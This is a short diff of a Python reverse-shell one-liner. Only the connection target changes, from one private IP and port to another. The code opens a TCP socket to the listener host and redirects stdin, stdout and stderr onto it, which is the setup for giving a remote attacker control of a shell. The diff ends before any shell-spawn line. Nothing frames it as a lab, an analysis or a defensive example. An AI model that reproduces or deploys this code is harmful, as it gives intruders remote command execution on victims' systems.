@@ -1,6 +1,6 @@
 import socket, subprocess, os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("192.168.121.150", 27107));
+s.connect(("192.168.121.153", 3108));
 os.dup2(s.fileno(), 0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
